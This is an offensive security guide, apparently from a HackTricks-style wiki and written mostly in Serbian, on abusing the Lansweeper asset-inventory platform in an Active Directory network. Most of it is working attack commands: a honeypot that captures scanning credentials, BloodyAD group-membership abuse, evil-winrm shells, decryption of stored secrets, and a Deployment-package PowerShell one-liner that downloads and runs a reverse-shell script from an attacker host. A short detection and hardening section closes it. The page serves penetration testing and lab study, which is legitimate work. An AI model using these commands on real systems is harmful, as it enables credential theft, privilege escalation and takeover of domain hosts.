# Lansweeper Zloupotreba: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper je platforma za otkrivanje i inventar IT resursa koja se često postavlja na Windows i integriše sa Active Directory. Kredencijali konfigurisani u Lansweeperu koriste njegovi skeneri za autentifikaciju na resurse preko protokola kao što su SSH, SMB/WMI i WinRM. Pogrešne konfiguracije često omogućavaju:

- Credential interception preusmeravanjem Scanning Target na host kojim kontroliše napadač (honeypot)
- Zloupotrebu AD ACLs izloženih od strane grupa povezanih sa Lansweeper-om kako bi se stekao daljinski pristup
- Dekriptovanje na hostu tajni konfigurisanim u Lansweeperu (connection strings i sačuvani scanning credentials)
- Code execution na upravljanim endpoint-ima preko Deployment feature (često se izvršava kao SYSTEM)

Ova stranica sumira praktične tokove rada napadača i komande za zloupotrebu ovih ponašanja tokom angažmana.

## 1) Harvest scanning credentials via honeypot (SSH example)

Ideja: kreirajte Scanning Target koji pokazuje na vaš host i povežite postojeće Scanning Credentials sa njim. Kada se scan pokrene, Lansweeper će pokušati da se autentifikuje tim kredencijalima, a vaš honeypot će ih zabeležiti.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Proverite captured creds protiv DC services:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Radi slično i za druge protokole kada možete primorati skener da se poveže na vaš listener (SMB/WinRM honeypots, itd.). SSH je često najjednostavniji.
- Mnogi skeneri se identifikuju posebnim client bannerima (npr. RebexSSH) i pokušavaće benignim komandama (uname, whoami, itd.).

## 2) AD ACL abuse: dobijte daljinski pristup tako što ćete sebe dodati u app-admin group

Koristite BloodHound za enumeraciju effective rights sa kompromitovanog naloga. Uobičajen nalaz je grupa specifična za skener ili aplikaciju (npr. “Lansweeper Discovery”) koja ima GenericAll nad privilegovanim grupom (npr. “Lansweeper Admins”). Ako je privilegovana grupa takođe član “Remote Management Users”, WinRM postaje dostupan nakon što sebe dodamo.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll na grupi pomoću BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Zatim dobijte interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Savet: Kerberos operacije su zavisne od vremena. Ako dobijete KRB_AP_ERR_SKEW, prvo sinhronizujte vreme sa DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt Lansweeper-configured secrets on the host

Na Lansweeper serveru, ASP.NET sajt obično čuva encrypted connection string i simetrični ključ koji aplikacija koristi. Sa odgovarajućim lokalnim pristupom možete decrypt DB connection string i zatim izvući stored scanning credentials.

Tipične lokacije:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Ključ aplikacije: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Koristite SharpLansweeperDecrypt to automate decryption and dumping of stored creds:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Očekivani izlaz uključuje DB detalje za konekciju i plaintext kredencijale za skeniranje, kao što su Windows i Linux nalozi koji se koriste širom infrastrukture. Oni često imaju povišena lokalna prava na hostovima u domeni:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Iskoristite vraćene Windows scanning creds za privilegovani pristup:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Kao član “Lansweeper Admins”, web UI izlaže Deployment i Configuration. Pod Deployment → Deployment packages, možete napraviti pakete koji pokreću proizvoljne komande na ciljnim asset-ima. Izvršenje obavlja Lansweeper service sa visokim privilegijama, što daje code execution kao NT AUTHORITY\SYSTEM na izabranom hostu.

Glavni koraci:
- Kreirajte novi Deployment package koji pokreće PowerShell ili cmd one-liner (reverse shell, add-user, itd.).
- Ciljajte željeni asset (npr. DC/host gde Lansweeper radi) i kliknite Deploy/Run now.
- Uhvatite shell kao SYSTEM.

Primer payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Operacije deploy-a su bučne i ostavljaju zapise u Lansweeper i Windows event logovima. Koristite ih pažljivo.

## Detekcija i hardening

- Ograničite ili uklonite anonimno SMB enumerisanje. Pratite RID cycling i anomalni pristup Lansweeper deljenjima.
- Kontrola izlaznog saobraćaja: blokirajte ili strogo ograničite outbound SSH/SMB/WinRM sa scanner hostova. Upozoravajte na nestandardne portove (npr. 2022) i neuobičajene client bannere kao Rebex.
- Zaštitite `Website\\web.config` i `Key\\Encryption.txt`. Eksternalizujte tajne u vault i rotirajte ih u slučaju izlaganja. Razmotrite servisne naloge sa minimalnim privilegijama i gMSA gde je moguće.
- AD monitoring: upozoravajte na promene u grupama vezanim za Lansweeper (npr. “Lansweeper Admins”, “Remote Management Users”) i na promene ACL-a koje dodeljuju GenericAll/Write članstvo u privilegovanim grupama.
- Audit-ujte kreiranje/izmene/izvršavanje Deployment paketa; upozoravajte na pakete koji pokreću cmd.exe/powershell.exe ili na neočekivane outbound konekcije.

## Povezane teme
- SMB/LSA/SAMR enumeracija i RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
